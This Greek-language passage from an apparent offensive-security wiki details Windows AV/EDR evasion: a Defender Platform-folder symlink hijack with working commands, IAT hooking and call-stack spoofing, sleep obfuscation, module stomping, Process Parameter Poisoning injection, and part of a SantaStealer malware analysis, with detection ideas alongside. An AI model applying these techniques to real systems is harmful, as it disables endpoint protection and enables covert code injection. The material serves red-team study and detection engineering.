- WDAC/Code Integrity: περιόρισε ποια υπογεγραμμένα binaries μπορούν να εκτελούνται ως PPL και από ποιες γονικές διεργασίες· μπλόκαρε την κλήση του ClipUp εκτός νόμιμων περιπτώσεων.
- Υγιεινή υπηρεσιών: περιόρισε τη δημιουργία/τροποποίηση υπηρεσιών αυτόματης εκκίνησης και παρακολούθησε τη χειραγώγηση της σειράς εκκίνησης.
- Βεβαιώσου ότι είναι ενεργοποιημένες η προστασία από παραποίηση του Defender και οι προστασίες πρώιμης εκκίνησης· διερεύνησε σφάλματα εκκίνησης που υποδεικνύουν αλλοίωση binary.
- Εξέτασε το ενδεχόμενο απενεργοποίησης της δημιουργίας ονομάτων σύντομης μορφής 8.3 σε τόμους που φιλοξενούν εργαλεία ασφαλείας, εφόσον είναι συμβατό με το περιβάλλον σου (κάνε εκτενή δοκιμή).

## Παραποίηση του Microsoft Defender μέσω Symlink Hijack φακέλου έκδοσης Platform

Το Windows Defender επιλέγει την πλατφόρμα από την οποία εκτελείται απαριθμώντας τους υποφακέλους κάτω από:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Επιλέγει τον υποφάκελο με τη μεγαλύτερη λεξικογραφικά συμβολοσειρά έκδοσης (π.χ., `4.18.25070.5-0`) και έπειτα εκκινεί από εκεί τις διεργασίες της υπηρεσίας Defender (ενημερώνοντας ανάλογα τις διαδρομές της υπηρεσίας/του registry). Αυτή η επιλογή εμπιστεύεται τις καταχωρίσεις καταλόγων, συμπεριλαμβανομένων των directory reparse points (symlinks). Ένας διαχειριστής μπορεί να το εκμεταλλευτεί για να ανακατευθύνει το Defender σε διαδρομή εγγράψιμη από attacker και να πετύχει DLL sideloading ή διακοπή λειτουργίας της υπηρεσίας.<sup>[[21]](#references)[[22]](#references)</sup>

Προϋποθέσεις
- Τοπικός Administrator (απαιτείται για τη δημιουργία καταλόγων/symlinks μέσα στον φάκελο Platform)
- Δυνατότητα επανεκκίνησης ή ενεργοποίησης νέας επιλογής πλατφόρμας από το Defender (επανεκκίνηση της υπηρεσίας κατά την εκκίνηση)
- Απαιτούνται μόνο ενσωματωμένα εργαλεία (`mklink`)

Γιατί λειτουργεί
- Το Defender μπλοκάρει τις εγγραφές στους δικούς του φακέλους, αλλά η επιλογή πλατφόρμας εμπιστεύεται τις καταχωρίσεις καταλόγων και επιλέγει την έκδοση με τη μεγαλύτερη λεξικογραφική τιμή χωρίς να επικυρώνει ότι ο προορισμός αντιστοιχεί σε προστατευμένη/έμπιστη διαδρομή.

Βήμα προς βήμα (παράδειγμα)
1) Προετοίμασε ένα εγγράψιμο αντίγραφο του τρέχοντος φακέλου πλατφόρμας, π.χ. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Δημιουργήστε ένα directory symlink υψηλότερης έκδοσης μέσα στο Platform, που να δείχνει στον φάκελό σας:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Επιλογή μηχανισμού ενεργοποίησης (συνιστάται επανεκκίνηση):
```cmd
shutdown /r /t 0
```
4) Επαληθεύστε ότι το MsMpEng.exe (WinDefend) εκτελείται από την ανακατευθυνόμενη διαδρομή:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Θα πρέπει να παρατηρήσετε τη νέα διαδρομή διεργασίας κάτω από το `C:\TMP\AV\` και τη διαμόρφωση υπηρεσίας/το registry να αντικατοπτρίζουν αυτήν τη θέση.

Επιλογές post-exploitation
- DLL sideloading/code execution: Αποθέστε/αντικαταστήστε DLL που φορτώνει το Defender από τον κατάλογο της εφαρμογής του, ώστε να εκτελέσετε κώδικα στις διεργασίες του Defender. Δείτε την παραπάνω ενότητα: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Τερματισμός υπηρεσίας/άρνηση υπηρεσίας: Αφαιρέστε το version-symlink, ώστε στην επόμενη εκκίνηση η διαμορφωμένη διαδρομή να μην επιλύεται και το Defender να μην ξεκινά:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```

> [!TIP]
> Σημειώστε ότι αυτή η τεχνική δεν παρέχει από μόνη της κλιμάκωση προνομίων· απαιτεί δικαιώματα διαχειριστή.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Οι red teams μπορούν να μεταφέρουν το runtime evasion έξω από το C2 implant και μέσα στην ίδια τη μονάδα-στόχο, κάνοντας hooking στον Import Address Table (IAT) της και δρομολογώντας επιλεγμένα API μέσω position-independent code (PIC) που ελέγχεται από τον επιτιθέμενο. Αυτό γενικεύει το evasion πέρα από το μικρό σύνολο API που εκθέτουν πολλά kits (π.χ. CreateProcessA) και επεκτείνει τις ίδιες προστασίες σε BOFs και DLLs post-exploitation.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

Προσέγγιση υψηλού επιπέδου
- Τοποθετήστε ένα PIC blob δίπλα στη μονάδα-στόχο χρησιμοποιώντας έναν reflective loader (με προσθήκη στην αρχή ή ως συνοδευτικό αρχείο). Το PIC πρέπει να είναι self-contained και position-independent.
- Καθώς φορτώνεται το host DLL, διατρέξτε το IMAGE_IMPORT_DESCRIPTOR και τροποποιήστε τις εγγραφές IAT για τα imports-στόχους (π.χ. CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc), ώστε να δείχνουν σε λεπτά PIC wrappers.
- Κάθε PIC wrapper εκτελεί evasions πριν καλέσει απευθείας το πραγματικό API. Τυπικά evasions περιλαμβάνουν:
  - Mask/unmask μνήμης γύρω από την κλήση (π.χ. κρυπτογράφηση περιοχών beacon, RWX→RX, αλλαγή ονομάτων/δικαιωμάτων σελίδων) και στη συνέχεια επαναφορά.
  - Call-stack spoofing: δημιουργία ενός benign stack και μετάβαση στο target API, ώστε η ανάλυση call-stack να εντοπίζει τα αναμενόμενα frames.<sup>[[9]](#references)</sup>
- Για λόγους συμβατότητας, εξαγάγετε ένα interface ώστε ένα Aggressor script (ή ισοδύναμο) να μπορεί να καταχωρίζει ποια API θα γίνεται hook για Beacon, BOFs και DLLs post-exploitation.

Γιατί IAT hooking εδώ
- Λειτουργεί για οποιονδήποτε κώδικα χρησιμοποιεί το API που έχει γίνει hook, χωρίς τροποποίηση του κώδικα του εργαλείου ή εξάρτηση από το Beacon για τη διαμεσολάβηση συγκεκριμένων API.
- Καλύπτει DLLs post-exploitation: το hooking των LoadLibrary* επιτρέπει την παρεμβολή κατά τη φόρτωση μονάδων (π.χ. System.Management.Automation.dll, clr.dll) και την εφαρμογή του ίδιου masking/stack evasion στις κλήσεις API τους.
- Αποκαθιστά την αξιόπιστη χρήση εντολών post-exploitation που δημιουργούν διεργασίες έναντι detections που βασίζονται στο call-stack, κάνοντας wrapping στα CreateProcessA/W.

Ελάχιστο περίγραμμα IAT hook (ψευδοκώδικας x64 C/C++)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notes
- Εφάρμοσε το patch μετά τις relocations/ASLR και πριν από την πρώτη χρήση του import. Reflective loaders όπως τα TitanLdr/AceLdr δείχνουν πώς γίνεται hooking κατά το DllMain του φορτωμένου module.
- Κράτα τα wrappers μικρά και PIC-safe· επίλυσε το πραγματικό API μέσω της αρχικής τιμής IAT που αποθήκευσες πριν από το patching ή μέσω του LdrGetProcedureAddress.
- Για PIC, χρησιμοποίησε μεταβάσεις RW → RX και μην αφήνεις σελίδες ταυτόχρονα writable και executable.

Call-stack spoofing stub
- PIC stubs τύπου Draugr δημιουργούν μια ψεύτικη αλυσίδα κλήσεων (return addresses μέσα σε benign modules) και έπειτα κάνουν pivot στο πραγματικό API.
- Αυτό παρακάμπτει detections που αναμένουν canonical stacks από Beacon/BOFs προς ευαίσθητα APIs.
- Συνδύασέ το με τεχνικές stack cutting/stack stitching, ώστε να καταλήγεις μέσα στα αναμενόμενα frames πριν από το API prologue.

Operational integration
- Πρόσθεσε τον reflective loader στην αρχή των post-ex DLLs, ώστε τα PIC και τα hooks να αρχικοποιούνται αυτόματα κατά τη φόρτωση του DLL.
- Χρησιμοποίησε ένα Aggressor script για να καταχωρίσεις target APIs, ώστε τα Beacon και BOFs να επωφελούνται διαφανώς από την ίδια διαδρομή evasion, χωρίς αλλαγές στον κώδικα.

Detection/DFIR considerations
- Ακεραιότητα IAT: entries που επιλύονται σε διευθύνσεις εκτός image (heap/anon)· περιοδική επαλήθευση των import pointers.
- Ανωμαλίες stack: return addresses που δεν ανήκουν σε φορτωμένα images· απότομες μεταβάσεις σε non-image PIC· ασυνεπής καταγωγή RtlUserThreadStart.
- Τηλεμετρία loader: εγγραφές στο IAT εντός της διεργασίας, πρώιμη δραστηριότητα DllMain που τροποποιεί import thunks, απροσδόκητες RX περιοχές που δημιουργούνται κατά τη φόρτωση.
- Evasion φόρτωσης image: αν γίνεται hooking στο LoadLibrary*, παρακολούθησε ύποπτες φορτώσεις automation/clr assemblies που συσχετίζονται με συμβάντα memory masking.

Related building blocks and examples
- Reflective loaders που κάνουν IAT patching κατά τη φόρτωση (π.χ. TitanLdr, AceLdr)
- Hooks memory masking (π.χ. simplehook) και stack-cutting PIC (stackcutting)
- PIC stubs για call-stack spoofing (π.χ. Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Import-time IAT hooks μέσω resident PICO

Αν ελέγχεις έναν reflective loader, μπορείς να κάνεις hook στα imports **κατά τη διάρκεια** του `ProcessImports()` αντικαθιστώντας τον pointer `GetProcAddress` του loader με έναν custom resolver που ελέγχει πρώτα τα hooks:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Δημιούργησε ένα **resident PICO** (persistent PIC object) που παραμένει μετά την αποδέσμευση του transient loader PIC.
- Εξήγαγε μια συνάρτηση `setup_hooks()` που αντικαθιστά τον import resolver του loader (π.χ. `funcs.GetProcAddress = _GetProcAddress`).
- Στο `_GetProcAddress`, παράκαμψε τα ordinal imports και χρησιμοποίησε αναζήτηση hook με βάση hash, όπως `__resolve_hook(ror13hash(name))`. Αν υπάρχει hook, επέστρεψέ το· διαφορετικά, κάνε delegate στο πραγματικό `GetProcAddress`.
- Καταχώρισε τους στόχους των hooks κατά το link time με entries Crystal Palace `addhook "MODULE$Func" "hook"`. Το hook παραμένει έγκυρο επειδή βρίσκεται μέσα στο resident PICO.

Έτσι επιτυγχάνεται **import-time IAT redirection** χωρίς patching στο code section του φορτωμένου DLL μετά τη φόρτωση.

### Εξαναγκασμός hookable imports όταν ο στόχος χρησιμοποιεί PEB-walking

Τα import-time hooks ενεργοποιούνται μόνο αν η συνάρτηση βρίσκεται πράγματι στο IAT του στόχου. Αν ένα module επιλύει APIs μέσω PEB-walk + hash (χωρίς import entry), ανάγκασε τη δημιουργία πραγματικού import, ώστε η διαδρομή `ProcessImports()` του loader να το εντοπίσει:

- Αντικατάστησε την επίλυση hashed exports (π.χ. `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) με άμεση αναφορά, όπως `&WaitForSingleObject`.
- Ο compiler δημιουργεί ένα IAT entry, επιτρέποντας την interception κατά την επίλυση των imports από τον reflective loader.

### Sleep/idle obfuscation τύπου Ekko χωρίς patching του `Sleep()`

Αντί να κάνεις patch το `Sleep`, κάνε hook στα **πραγματικά wait/IPC primitives** που χρησιμοποιεί το implant (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Για μεγάλες αναμονές, τύλιξε την κλήση σε αλυσίδα obfuscation τύπου Ekko που κρυπτογραφεί το in-memory image κατά την αδράνεια:<sup>[[31]](#references)[[27]](#references)</sup>

- Χρησιμοποίησε το `CreateTimerQueueTimer` για να προγραμματίσεις μια ακολουθία callbacks που καλούν το `NtContinue` με κατασκευασμένα `CONTEXT` frames.
- Τυπική αλυσίδα (x64): όρισε το image ως `PAGE_READWRITE` → κρυπτογράφησε με RC4 μέσω του `advapi32!SystemFunction032` ολόκληρο το mapped image → εκτέλεσε την blocking αναμονή → αποκρυπτογράφησε με RC4 → **επανάφερε τα δικαιώματα ανά section** διατρέχοντας τα PE sections → σήμανε την ολοκλήρωση.
- Το `RtlCaptureContext` παρέχει ένα πρότυπο `CONTEXT`· κλωνοποίησέ το σε πολλαπλά frames και όρισε registers (`Rip/Rcx/Rdx/R8/R9`) για την εκτέλεση κάθε βήματος.

Operational detail: επέστρεψε “success” για μεγάλες αναμονές (π.χ. `WAIT_OBJECT_0`), ώστε ο caller να συνεχίσει ενώ το image είναι masked. Αυτό το μοτίβο αποκρύπτει το module από scanners στα διαστήματα αδράνειας και αποφεύγει το κλασικό signature του “patched `Sleep()`”.

Detection ideas (telemetry-based)
- Ριπές callbacks `CreateTimerQueueTimer` που δείχνουν στο `NtContinue`.
- Χρήση του `advapi32!SystemFunction032` σε μεγάλα, συνεχόμενα buffers μεγέθους image.
- `VirtualProtect` σε μεγάλο εύρος, ακολουθούμενο από custom επαναφορά δικαιωμάτων ανά section.

### Runtime CFG registration για gadgets sleep-obfuscation

Σε στόχους με ενεργοποιημένο CFG, το πρώτο indirect jump σε mid-function gadget, όπως `jmp [rbx]` ή `jmp rdi`, συνήθως προκαλεί crash της διεργασίας με `STATUS_STACK_BUFFER_OVERRUN`, επειδή το gadget δεν υπάρχει στα CFG metadata του module. Για να παραμένουν ενεργές οι αλυσίδες τύπου Ekko/Kraken σε hardened διεργασίες:<sup>[[30]](#references)</sup>

- Καταχώρισε κάθε indirect destination που χρησιμοποιεί η αλυσίδα με `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` και entries `CFG_CALL_TARGET_VALID`.
- Για διευθύνσεις μέσα σε φορτωμένα images (`ntdll`, `kernel32`, `advapi32`), το `MEMORY_RANGE_ENTRY` πρέπει να ξεκινά από το **image base** και να καλύπτει το **πλήρες μέγεθος του image**.
- Για manually mapped/PIC/stomped περιοχές, χρησιμοποίησε αντί γι' αυτό το **allocation base** και το μέγεθος της allocation.
- Σήμανε όχι μόνο το dispatch gadget, αλλά και exports στα οποία γίνεται έμμεση πρόσβαση (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, wait/event syscalls), καθώς και τυχόν executable sections που ελέγχονται από τον attacker και θα γίνουν indirect targets.

Έτσι, οι αλυσίδες sleep τύπου ROP/JOP μετατρέπονται από «λειτουργούν μόνο σε διεργασίες χωρίς CFG» σε επαναχρησιμοποιήσιμο primitive για τα `explorer.exe`, browsers, `svchost.exe` και άλλα endpoints που έχουν γίνει compile με `/guard:cf`.

### CET-safe stack spoofing για threads σε κατάσταση sleep

Η πλήρης αντικατάσταση του `CONTEXT` είναι θορυβώδης και μπορεί να αποτύχει σε συστήματα CET Shadow Stack, επειδή ένα spoofed `Rip` πρέπει να συμφωνεί με το hardware shadow stack. Ένα ασφαλέστερο μοτίβο sleep-masking είναι το εξής:<sup>[[30]](#references)</sup>

- Επίλεξε ένα άλλο thread στην ίδια διεργασία και διάβασε τα όρια stack του `NT_TIB` / TEB (`StackBase`, `StackLimit`) μέσω του `NtQueryInformationThread`.
- Δημιούργησε backup του πραγματικού TEB/TIB του τρέχοντος thread.
- Κατέγραψε το πραγματικό context κατά την αναμονή με `GetThreadContext`.
- Αντέγραψε **μόνο** το πραγματικό `Rip` στο spoof context, αφήνοντας ανέπαφα τα spoofed `Rsp`/stack state.
- Κατά το διάστημα sleep, αντέγραψε το `NT_TIB` του spoof thread στο τρέχον TEB, ώστε οι stack walkers να κάνουν unwind μέσα σε νόμιμο εύρος stack.
- Μετά το τέλος της αναμονής, επανάφερε το αρχικό TIB και thread context.

Έτσι διατηρείται ένας instruction pointer συμβατός με το CET, ενώ παραπλανώνται οι EDR stack walkers που εμπιστεύονται τα stack metadata του TEB για την επικύρωση των unwinds.

### Εναλλακτική με APC: Kraken Mask

Αν το dispatch μέσω timer-queue έχει υπερβολικά αναγνωρίσιμο signature, η ίδια ακολουθία sleep-encrypt-spoof-restore μπορεί να εκτελεστεί από ένα suspended helper thread, χρησιμοποιώντας queued APCs:<sup>[[27]](#references)</sup>

- Δημιούργησε ένα helper thread με entrypoint το `NtTestAlert`.
- Βάλε στην ουρά προετοιμασμένα `CONTEXT` frames/APCs με `NtQueueApcThread` και εκτέλεσέ τα με `NtAlertResumeThread`.
- Αποθήκευσε την κατάσταση της αλυσίδας στο heap αντί για το stack του helper, ώστε να μην εξαντληθεί το προεπιλεγμένο stack των 64 KB του thread.
- Χρησιμοποίησε το `NtSignalAndWaitForSingleObject` για να σημάνεις ατομικά το start event και να μπλοκάρεις.
- Κάνε suspend το main thread πριν από την επαναφορά του TIB/context (`NtSuspendThread` → restore → `NtResumeThread`), ώστε να μειωθεί το race window κατά το οποίο ένας scanner θα μπορούσε να εντοπίσει ένα stack που έχει αποκατασταθεί μόνο εν μέρει.

Αυτό αντικαθιστά το signature `CreateTimerQueueTimer` + `NtContinue` με ένα signature helper-thread/APC, διατηρώντας τους ίδιους στόχους RC4 masking και stack-spoofing.

Additional detection ideas
- `NtSetInformationVirtualMemory` με `VmCfgCallTargetInformation` λίγο πριν από sleeps, waits ή APC dispatch.
- `GetThreadContext`/`SetThreadContext` γύρω από τα `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` ή `ConnectNamedPipe`.
- `NtQueryInformationThread` και στη συνέχεια άμεσες εγγραφές στα stack bounds του TEB/TIB του τρέχοντος thread.
- Αλυσίδες `NtQueueApcThread`/`NtAlertResumeThread` που οδηγούν έμμεσα σε `SystemFunction032`, `VirtualProtect` ή helpers επαναφοράς δικαιωμάτων section.
- Επαναλαμβανόμενη χρήση σύντομων gadget signatures, όπως `FF 23` (`jmp [rbx]`) ή `FF E7` (`jmp rdi`), ως dispatch pivots μέσα σε signed modules.


## Precision Module Stomping

Το module stomping εκτελεί payloads από το **`.text` section ενός DLL που είναι ήδη mapped μέσα στη διεργασία-στόχο**, αντί να δεσμεύει εμφανή private executable memory ή να φορτώνει ένα νέο sacrificial DLL. Ο στόχος overwrite πρέπει να είναι ένα **φορτωμένο, disk-backed image**, του οποίου ο χώρος κώδικα μπορεί να φιλοξενήσει το payload χωρίς να αλλοιώσει code paths που εξακολουθεί να χρειάζεται η διεργασία.<sup>[[1]](#references)[[2]](#references)</sup>

### Αξιόπιστη επιλογή στόχου

Το αφελές stomping σε συνηθισμένα modules όπως τα `uxtheme.dll` ή `comctl32.dll` είναι εύθραυστο: το DLL μπορεί να μην είναι φορτωμένο στην απομακρυσμένη διεργασία, ενώ μια περιοχή κώδικα που είναι πολύ μικρή μπορεί να προκαλέσει crash στη διεργασία. Μια πιο αξιόπιστη ροή εργασίας είναι:

1. Απαρίθμησε τα modules της διεργασίας-στόχου και κράτησε μια include list **μόνο με ονόματα** των ήδη φορτωμένων DLLs.
2. Δημιούργησε πρώτα το payload και κατέγραψε το **ακριβές μέγεθός του σε bytes**.
3. Σάρωσε υποψήφια DLLs στον δίσκο και σύγκρινε το **`.text` `Misc_VirtualSize`** του PE section με το μέγεθος του payload. Αυτό έχει μεγαλύτερη σημασία από το μέγεθος του αρχείου, επειδή αντικατοπτρίζει το μέγεθος του executable section **όταν γίνεται map στη μνήμη**.
4. Ανάλυσε το **Export Address Table (EAT)** και επίλεξε ένα RVA exported function ως αρχική offset για το stomp.
5. Υπολόγισε την **blast radius**: αν το payload ξεπεράσει τα όρια της επιλεγμένης συνάρτησης, θα αντικαταστήσει γειτονικά exports που βρίσκονται μετά από αυτή στη μνήμη.

Συνηθισμένα βοηθητικά εργαλεία recon/επιλογής που έχουν εντοπιστεί στην πράξη:

```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```

Λειτουργικές σημειώσεις
- Προτιμήστε DLL που είναι **ήδη φορτωμένα** στην απομακρυσμένη διεργασία, για να αποφύγετε την τηλεμετρία του `LoadLibrary`/των απροσδόκητων φορτώσεων image.
- Προτιμήστε exports που εκτελούνται σπάνια από την εφαρμογή-στόχο· διαφορετικά, κανονικές διαδρομές κώδικα ενδέχεται να φτάσουν στα stomped bytes πριν ή μετά τη δημιουργία του thread.
- Για μεγάλα implants, συχνά απαιτείται η αλλαγή του τρόπου ενσωμάτωσης του shellcode από string literal σε **byte-array/braced initializer**, ώστε να αναπαρίσταται σωστά ολόκληρο το buffer στον πηγαίο κώδικα του injector.

Ιδέες ανίχνευσης
- Απομακρυσμένες εγγραφές σε **εκτελέσιμες σελίδες που υποστηρίζονται από image** (`MEM_IMAGE`, `PAGE_EXECUTE*`), αντί για τις συνηθέστερες ιδιωτικές δεσμεύσεις RWX/RX.
- Σημεία εισόδου export των οποίων τα in-memory bytes δεν ταιριάζουν πλέον με το αντίστοιχο αρχείο στο δίσκο.
- Απομακρυσμένα threads ή pivots περιβάλλοντος εκτέλεσης που ξεκινούν μέσα σε export νόμιμου DLL, του οποίου τα πρώτα bytes τροποποιήθηκαν πρόσφατα.
- Ύποπτες ακολουθίες `VirtualProtect(Ex)` / `WriteProcessMemory` σε σελίδες `.text` DLL, ακολουθούμενες από δημιουργία thread.

## Process Parameter Poisoning (P3)

Το Process Parameter Poisoning (P3) είναι μια τεχνική **process-injection / EDR-evasion** που αποφεύγει την κλασική διαδρομή απομακρυσμένης εγγραφής (`VirtualAllocEx` + `WriteProcessMemory`). Αντί να αντιγράφει bytes σε έναν ήδη εκτελούμενο στόχο, εκμεταλλεύεται το γεγονός ότι τα Windows **αντιγράφουν επιλεγμένες παραμέτρους εκκίνησης του `CreateProcessW` στη διεργασία-παιδί** και τις αποθηκεύουν μέσα στο `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`).<sup>[[28]](#references)[[29]](#references)</sup>

### Carriers που μπορούν να δηλητηριαστούν και αντιγράφονται από το `CreateProcessW`

Χρήσιμα carriers είναι:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (με `CREATE_UNICODE_ENVIRONMENT`) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Πρακτικοί περιορισμοί των carriers:

- Το `lpCommandLine` πρέπει να δείχνει σε **εγγράψιμη μνήμη** για το `CreateProcessW` και περιορίζεται στους **32.767 χαρακτήρες Unicode**, συμπεριλαμβανομένου του null terminator.
- Το `lpEnvironment` πρέπει να είναι ένα block περιβάλλοντος Unicode από διαδοχικές συμβολοσειρές `NAME=VALUE\0`, οι οποίες τερματίζονται με ένα επιπλέον `\0`.
- Το `lpReserved` είναι επίσημα δεσμευμένο, επομένως η αντιστοίχιση στο `ShellInfo` θα πρέπει να θεωρείται λεπτομέρεια υλοποίησης και όχι σταθερό, τεκμηριωμένο συμβόλαιο.

Έτσι, η κανονική δημιουργία διεργασίας μετατρέπεται σε **primitive μεταφοράς payload**. Ο operator δημιουργεί τη διεργασία-παιδί με δεδομένα εκκίνησης που ελέγχει ο attacker και αφήνει τα Windows να εκτελέσουν την αντιγραφή μεταξύ διεργασιών.

### Ροή απομακρυσμένης αναζήτησης χωρίς APIs απομακρυσμένης εγγραφής

Μετά τη δημιουργία της διεργασίας-παιδιού, εντοπίστε το αντιγραμμένο buffer με primitives **μόνο για ανάγνωση**:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → λήψη του `PROCESS_BASIC_INFORMATION.PebBaseAddress`
2. Ανάγνωση του απομακρυσμένου `PEB`
3. Ακολούθηση του `PEB.ProcessParameters`
4. Ανάγνωση του `RTL_USER_PROCESS_PARAMETERS`
5. Χρήση του επιλεγμένου pointer:
   - `parameters.CommandLine.Buffer`
   - `parameters.Environment`
   - `parameters.ShellInfo.Buffer`

Ελάχιστη ροή:

```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```

### Εκτέλεση του αντιγραμμένου buffer παραμέτρων

Η αντιγραμμένη περιοχή παραμέτρων έχει συνήθως δικαιώματα `RW`, όχι εκτέλεσης. Μια συνηθισμένη αλυσίδα P3 είναι:

1. Δημιουργία της διεργασίας κανονικά (όχι σε αναστολή)
2. Ορισμός της επιλεγμένης σελίδας παραμέτρων ως εκτελέσιμης με `NtProtectVirtualMemory` / `VirtualProtectEx`
3. Επαναχρησιμοποίηση του handle του κύριου thread που έχει ήδη επιστραφεί στο `PROCESS_INFORMATION`
4. Ανακατεύθυνση της εκτέλεσης με `NtSetContextThread` (`CONTEXT_CONTROL`, αντικατάσταση του `RIP`)

Σε αντίθεση με τις κλασικές ροές εργασίας thread hijacking, αυτό **δεν απαιτεί** `SuspendThread` / `ResumeThread`· το context μπορεί να αλλάξει απευθείας στο handle του κύριου thread που επιστράφηκε.

Αυτό αποφεύγει αρκετά API που παρακολουθούνται συχνά για injection:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- συχνά και τα `SuspendThread` / `ResumeThread`

### Περιορισμός null-byte και staged shellcode

Και οι τρεις φορείς είναι **string ή δεδομένα τύπου string**, επομένως ένα raw payload που περιέχει `0x00` περικόπτεται κατά τη μεταφορά. Μια πρακτική λύση είναι ένα **πρώτο στάδιο χωρίς null bytes**, το οποίο ανακατασκευάζει σταθερές κατά την εκτέλεση και έπειτα φορτώνει ένα αυθαίρετο δεύτερο στάδιο.

Ένα απλό μοτίβο είναι η σύνθεση σταθερών με βάση το XOR:

```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```

Αυτό επιτρέπει στο πρώτο στάδιο να δημιουργεί συμβολοσειρές στο stack, ορίσματα API, διαδρομές DLL ή έναν loader shellcode δεύτερου σταδίου χωρίς να ενσωματώνει null bytes στην παράμετρο που μεταφέρεται.

### Κλήσεις API μέσω stack από το πρώτο στάδιο

Όταν το πρώτο στάδιο πρέπει να καλέσει API όπως το `LoadLibraryA`, μπορεί να:

- κάνει push τη συμβολοσειρά/το buffer στο stack του target
- δεσμεύσει το **32-byte x64 shadow space**
- ορίσει τα `RCX`, `RDX`, `R8`, `R9` σε σταθερές τιμές ή δείκτες σχετικούς με το `RSP`
- διατηρεί το `RSP` **ευθυγραμμισμένο στα 16 byte** πριν από την κλήση

Έπειτα, ένα δεύτερο στάδιο μπορεί να αντιγραφεί από το stack σε μια εκχώρηση `PAGE_READWRITE`, να αλλάξει η προστασία της σε `PAGE_EXECUTE_READ` με το `VirtualProtect` και να γίνει jump σε αυτό, αποφεύγοντας μια άμεση εκχώρηση RWX.

### Ιδέες για detection

Καλές ευκαιρίες για hunting που αναφέρουν οι συγγραφείς:

- `VirtualProtectEx` / `NtProtectVirtualMemory` που καθιστούν **σελίδες παραμέτρων διεργασίας εκτελέσιμες**
- αυτή η αλλαγή προστασίας να ακολουθείται από `SetThreadContext` / `NtSetContextThread`
- απομακρυσμένες αναγνώσεις των `PEB` και στη συνέχεια του `RTL_USER_PROCESS_PARAMETERS`
- ασυνήθιστα μεγάλες τιμές ή τιμές υψηλής εντροπίας στα `lpCommandLine`, `lpEnvironment` ή `STARTUPINFO.lpReserved` κατά τη δημιουργία διεργασίας

### Σημειώσεις

- Το P3 είναι ένα **trick μεταφοράς μεταξύ διεργασιών**, όχι από μόνο του πλήρης primitive εκτέλεσης: η αντιγραμμένη παράμετρος εξακολουθεί να χρειάζεται αλλαγή δικαιωμάτων εκτέλεσης και μέθοδο ανακατεύθυνσης της εκτέλεσης.
- Οι συγγραφείς εξέτασαν το `RtlCreateProcessReflection` / Dirty Vanity αλλά το απέρριψαν, επειδή εσωτερικά καταλήγει σε ύποπτα primitives όπως τα `NtWriteVirtualMemory` και `NtCreateThreadEx`.

## Tradecraft του SantaStealer για fileless evasion και κλοπή διαπιστευτηρίων

Το SantaStealer (γνωστό και ως BluelineStealer) δείχνει πώς τα σύγχρονα info-stealers συνδυάζουν AV bypass, anti-analysis και πρόσβαση σε διαπιστευτήρια σε μία ενιαία ροή εργασιών.<sup>[[24]](#references)</sup>

### Έλεγχος διάταξης πληκτρολογίου και καθυστέρηση sandbox

- Μια σημαία διαμόρφωσης (`anti_cis`) απαριθμεί τις εγκατεστημένες διατάξεις πληκτρολογίου μέσω του `GetKeyboardLayoutList`. Αν εντοπιστεί κυριλλική διάταξη, το δείγμα δημιουργεί έναν κενό δείκτη `CIS` και τερματίζεται πριν εκτελέσει stealers, διασφαλίζοντας ότι δεν θα εκτελεστεί ποτέ σε εξαιρούμενες τοπικές ρυθμίσεις, ενώ παράλληλα αφήνει ένα artifact για hunting.

```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
    LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
    if (lang == LANG_RUSSIAN) {
